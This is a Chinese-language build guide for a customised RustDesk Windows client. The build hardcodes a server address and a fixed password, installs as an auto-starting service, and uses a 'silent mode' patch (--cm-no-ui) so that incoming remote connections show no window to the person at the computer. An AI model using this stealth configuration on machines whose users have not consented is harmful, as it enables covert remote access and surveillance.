# Flutter Custom Build 使用指南

## 📋 概述

**Flutter Custom Build** 工作流专门用于编译带有**预设配置**和**静默模式**的 Flutter Windows 版本。

### 🌟 核心特性

| 特性 | 说明 |
|------|------|
| **Flutter UI** | 现代化界面，性能优异 |
| **硬件加速** | hwcodec + vram，视频编解码性能提升 5-10 倍 |
| **预设配置** | 编译时内置服务器地址和密码 |
| **静默模式** | 被连接时不弹出窗口，适合无人值守 |
| **完整服务支持** | 可安装为 Windows 服务，自动启动 |

---

## 🎯 与其他编译方式对比

| 特性 | Flutter Custom Build | Custom Build (Sciter) | Flutter Tag Build |
|------|---------------------|----------------------|-------------------|
| **UI 引擎** | Flutter（现代） | Sciter（传统） | Flutter（现代） |
| **预设配置** | ✅ 编译时内置 | ✅ 编译时内置 | ❌ 需手动配置 |
| **静默模式** | ✅ 被连接时无弹窗 | ⚠️ 不支持 | ❌ 默认有弹窗 |
| **服务支持** | ✅ 完整支持 | ❌ 不支持 | ✅ 完整支持 |
| **硬件加速** | ✅ 完整支持 | ❌ 未启用 | ✅ 完整支持 |
| **文件大小** | ~40 MB | ~20 MB | ~40 MB |
| **编译时间** | ~30 分钟 | ~10 分钟 | ~30 分钟 |
| **适用场景** | **企业部署、无人值守** | 快速测试 | 普通用户 |

**推荐使用 Flutter Custom Build 的场景**：
- ✅ 企业批量部署
- ✅ 无人值守远程控制
- ✅ 服务器远程管理
- ✅ 需要预设配置避免手动设置
- ✅ 被控端不希望有弹窗打扰

---

## 🚀 快速开始

### 第 1 步：修改预设配置

编辑 `src/default_config.rs`，修改服务器地址和密码：

```rust
pub fn set_unattended_defaults() {
    // 1. 设置 ID 服务器地址
    Config::set_option(
        "relay-server".to_owned(),
        "你的服务器地址".to_owned(),  // 修改这里
    );
    
    // 2. 设置固定密码
    Config::set_permanent_password("你的密码".to_owned());  // 修改这里
    
    // 3. 其他配置...
}
```

### 第 2 步：提交代码

```bash
git add src/default_config.rs
git commit -m "Update default config"
git push origin master
```

### 第 3 步：运行工作流

1. 打开 GitHub 仓库
2. 点击 **Actions** 标签
3. 选择 **Flutter Custom Build with Default Config**
4. 点击 **Run workflow**
5. 选择参数：
   - **upload-artifact**: `true`（上传编译产物）
   - **upload-tag**: `custom`（版本标签）
6. 点击 **Run workflow** 开始编译

### 第 4 步：下载编译产物

编译完成后（约 30 分钟）：

1. 在 Actions 页面找到刚才的运行记录
2. 向下滚动找到 **Artifacts** 部分
3. 下载 `rustdesk-custom-windows-x86_64-exe`
4. 解压得到 `rustdesk-1.4.4-custom-x86_64.exe`

---

## 🔧 静默模式实现

### 什么是静默模式

静默模式是指**当其他人远程连接此电脑时，不会弹出连接管理窗口**。

#### 正常模式（官方版本）

```
其他人连接 →  弹出连接管理窗口 → 显示对方操作
                ↓
          影响正在使用电脑的用户
```

#### 静默模式（Flutter Custom Build）

```
其他人连接 →  静默处理，不弹窗 → 后台记录日志
                ↓
          不影响正在使用电脑的用户
```

### 技术实现

静默模式通过修改 `src/server/connection.rs` 实现：

```rust
// connection.rs 第 4374-4378 行
// 在 Windows 平台上使用无 UI 模式，避免弹出窗口
#[cfg(target_os = "windows")]
{
    args = vec!["--cm-no-ui"];
}
```

**原理**：
1. 当有远程连接请求时，启动连接管理器（Connection Manager）
2. 正常情况下使用 `--cm` 参数，会弹出管理窗口
3. 静默模式使用 `--cm-no-ui` 参数，不启动 UI 界面
4. 连接在后台处理，所有操作记录到日志

### 验证静默模式

编译后测试：

```powershell
# 1. 启动程序
.\rustdesk-1.4.4-custom-x86_64.exe

# 2. 从另一台电脑连接此电脑

# 3. 观察被控端
# ✅ 正常：不会弹出连接管理窗口
# ❌ 异常：如果弹窗了，说明静默模式未生效

# 4. 检查日志（应该有连接记录）
Get-Content "$env:APPDATA\RustDesk\rustdesk.log" -Tail 20
```

---

## 📦 编译产物说明

### 文件结构

```
rustdesk-1.4.4-custom-x86_64.exe  ← 自解压可执行文件
    ↓ 双击运行后自动解压到临时目录
    ↓
    ├── rustdesk.exe              ← Flutter 主程序
    ├── librustdesk.dll           ← Rust 核心库（包含预设配置）
    ├── dylib_virtual_display.dll ← 虚拟显示驱动
    ├── flutter_windows.dll       ← Flutter 引擎
    ├── data/                     ← Flutter 资源
    │   └── flutter_assets/
    ├── usbmmidd_v2/              ← USB 虚拟显示器驱动
    ├── drivers/                  ← 打印机驱动
    └── README.txt                ← 使用说明
```

### 特性说明

#### 1. 预设配置

预设配置内置在 `librustdesk.dll` 中，启动时自动生效：

```rust
// 首次运行时自动配置
pub fn init_default_settings() {
    if !Config::get_option("custom_config_applied").is_empty() {
        return; // 已经配置过，跳过
    }
    
    // 应用预设配置
    set_unattended_defaults();
    
    // 标记为已配置
    Config::set_option("custom_config_applied".to_owned(), "true".to_owned());
}
```

#### 2. 静默模式

静默模式在 `connection.rs` 中实现，Windows 平台自动启用：

```rust
#[cfg(target_os = "windows")]
{
    args = vec!["--cm-no-ui"];  // 使用无 UI 模式
}
```

#### 3. 服务支持

完整的 Windows 服务支持：

```powershell
# 安装服务（需要管理员权限）
.\rustdesk-1.4.4-custom-x86_64.exe --install-service

# 启动服务
sc start rustdesk

# 查看服务状态
sc query rustdesk

# 卸载服务
.\rustdesk-1.4.4-custom-x86_64.exe --uninstall-service
```

---

## ⚙️ 高级配置

### 修改静默模式行为

如果你想在某些情况下禁用静默模式，可以修改代码：

```rust
// src/server/connection.rs
// 方案 1：完全禁用静默模式（恢复弹窗）
#[cfg(target_os = "windows")]
{
    // args = vec!["--cm-no-ui"];  // 注释掉这行
    args = vec!["--cm"];  // 使用正常模式
}

// 方案 2：根据配置决定是否静默
#[cfg(target_os = "windows")]
{
    let silent_mode = Config::get_option("silent_mode");
    if silent_mode == "Y" {
        args = vec!["--cm-no-ui"];
    } else {
        args = vec!["--cm"];
    }
}
```

### 添加更多预设配置

编辑 `src/default_config.rs`：

```rust
pub fn set_unattended_defaults() {
    // 服务器配置
    Config::set_option("relay-server".to_owned(), "你的服务器".to_owned());
    Config::set_permanent_password("你的密码".to_owned());
    
    // 新增：禁用剪贴板同步
    Config::set_option("disable-clipboard".to_owned(), "Y".to_owned());
    
    // 新增：禁用音频传输
    Config::set_option("disable-audio".to_owned(), "Y".to_owned());
    
    // 新增：自动录制所有会话
    Config::set_option("auto-record-incoming".to_owned(), "Y".to_owned());
    
    // 新增：设置连接超时
    Config::set_option("connection-timeout".to_owned(), "30".to_owned());
}
```

---

## 🧪 测试验证

### 测试清单

#### ✅ 基础功能测试

- [ ] 程序能正常启动
- [ ] 界面显示正常（Flutter UI）
- [ ] 能看到预设的 ID
- [ ] 服务器地址已自动配置

#### ✅ 预设配置测试

```powershell
# 1. 启动程序
.\rustdesk-1.4.4-custom-x86_64.exe

# 2. 检查配置文件
$config = Get-Content "$env:APPDATA\RustDesk\config\RustDesk2.toml"
Write-Output $config

# 3. 验证服务器地址
# 应该看到你预设的服务器地址

# 4. 验证密码
# 应该显示固定密码，不是随机生成的
```

#### ✅ 静默模式测试

```powershell
# 1. 启动被控端
.\rustdesk-1.4.4-custom-x86_64.exe

# 2. 从控制端连接

# 3. 观察被控端
# ✅ 应该不弹出连接管理窗口
# ✅ 托盘图标应该显示有连接
# ✅ 日志应该记录连接信息

# 4. 检查进程
Get-Process rustdesk | Select-Object Name, CommandLine
# 应该看到 rustdesk.exe --cm-no-ui
```

#### ✅ 服务模式测试

```powershell
# 1. 安装服务（管理员权限）
.\rustdesk-1.4.4-custom-x86_64.exe --install-service

# 2. 检查服务状态
sc query rustdesk
# 应该显示 RUNNING

# 3. 重启电脑

# 4. 检查服务是否自动启动
sc query rustdesk

# 5. 从远程电脑连接
# 应该能正常连接，且不弹窗

# 6. 卸载服务
.\rustdesk-1.4.4-custom-x86_64.exe --uninstall-service
```

#### ✅ 性能测试

```powershell
# 1. 建立远程连接

# 2. 检查 CPU 占用
Get-Process rustdesk | Select-Object Name, CPU

# 3. 检查内存占用
Get-Process rustdesk | Select-Object Name, WorkingSet

# 4. 测试视频流畅度
# 移动窗口、播放视频等
# 应该比 Sciter 版本流畅很多（硬件加速）
```

---

## 🔍 故障排查

### 问题 1：静默模式未生效，仍然弹窗

**可能原因**：
1. 代码修改未生效
2. 使用了错误的编译产物

**解决方法**：

```powershell
# 1. 检查进程命令行参数
Get-Process rustdesk | Select-Object Name, CommandLine

# 应该看到：
# rustdesk.exe --cm-no-ui  ← 正确
# rustdesk.exe --cm        ← 错误，会弹窗

# 2. 如果是 --cm，说明代码未修改正确
# 重新编辑 src/server/connection.rs
# 确保第 4374-4378 行的代码存在：
# #[cfg(target_os = "windows")]
# {
#     args = vec!["--cm-no-ui"];
# }

# 3. 重新编译
```

### 问题 2：预设配置未生效

**可能原因**：
1. `default_config` 特性未启用
2. 配置文件已存在，未覆盖

**解决方法**：

```powershell
# 1. 删除旧的配置文件
Remove-Item -Recurse -Force "$env:APPDATA\RustDesk"

# 2. 重新运行程序
.\rustdesk-1.4.4-custom-x86_64.exe

# 3. 检查日志
Get-Content "$env:APPDATA\RustDesk\rustdesk.log" -Tail 50
# 应该看到 "Applying default config" 或类似日志

# 4. 检查编译日志，确认 default_config 特性已启用
# 在 GitHub Actions 日志中搜索：
# cargo build --features flutter,hwcodec,vram,default_config
```

### 问题 3：服务安装失败

**可能原因**：
1. 权限不足
2. 服务已存在

**解决方法**：

```powershell
# 1. 检查是否以管理员身份运行
# 右键程序 → "以管理员身份运行"

# 2. 卸载旧服务
sc stop rustdesk
sc delete rustdesk

# 3. 重新安装
.\rustdesk-1.4.4-custom-x86_64.exe --install-service

# 4. 检查服务状态
sc query rustdesk

# 5. 查看事件日志
Get-EventLog -LogName Application -Source rustdesk -Newest 10
```

### 问题 4：编译失败

**可能原因**：
1. vcpkg 依赖安装失败
2. Flutter 环境问题

**解决方法**：

```yaml
# 查看 GitHub Actions 日志，定位错误

# 常见错误 1：vcpkg 安装超时
# 解决：重新运行工作流

# 常见错误 2：Flutter 编译失败
# 解决：检查 Flutter 版本是否正确（3.24.5）

# 常见错误 3：Rust 编译失败
# 解决：检查 Rust 版本（1.75）和特性是否正确
```

---

## 📚 相关文档

| 文档 | 说明 |
|------|------|
| `Flutter_Tag_Build与Custom_Build深度对比分析.md` | 编译方式对比分析 |
| `Custom_Build服务安装问题分析.md` | 服务安装问题详解 |
| `配置说明.md` | 配置选项详解 |
| `预设配置清单.md` | 可用的预设配置项 |

---

## 💡 最佳实践

### 企业部署建议

1. **编译前规划**：
   - 确定服务器地址
   - 设计密码策略
   - 决定是否需要静默模式

2. **编译时配置**：
   - 修改 `src/default_config.rs`
   - 添加企业专有配置
   - 设置日志级别

3. **测试验证**：
   - 完整测试所有功能
   - 验证静默模式
   - 测试服务模式

4. **批量部署**：
   - 使用 MSI 打包（可选）
   - GPO 推送安装
   - 自动安装为服务

5. **监控维护**：
   - 收集日志
   - 监控连接状态
   - 定期更新版本

### 安全建议

1. **密码管理**：
   - 使用强密码
   - 定期更换密码
   - 不要在代码中硬编码敏感信息

2. **网络安全**：
   - 配置防火墙规则
   - 使用 VPN 或专网
   - 限制连接来源 IP

3. **日志审计**：
   - 启用详细日志
   - 定期审查连接记录
   - 监控异常行为

---

## 🎓 总结

**Flutter Custom Build** 是专为企业部署和无人值守场景设计的编译方案：

| 优势 |
|------|
| ✅ **预设配置**：编译时内置，无需手动配置 |
| ✅ **静默模式**：被连接时不弹窗，用户无感知 |
| ✅ **完整功能**：Flutter UI + 硬件加速 + 服务支持 |
| ✅ **稳定可靠**：基于官方 Flutter 版本，经过充分测试 |
| ✅ **企业友好**：适合批量部署和集中管理 |

**开始使用**：
1. 修改 `src/default_config.rs` 和 `src/server/connection.rs`
2. 运行 **Flutter Custom Build with Default Config** 工作流
3. 下载编译产物并测试
4. 批量部署到目标机器

**下一步**：查看 `Flutter_Tag_Build与Custom_Build深度对比分析.md` 了解技术细节。
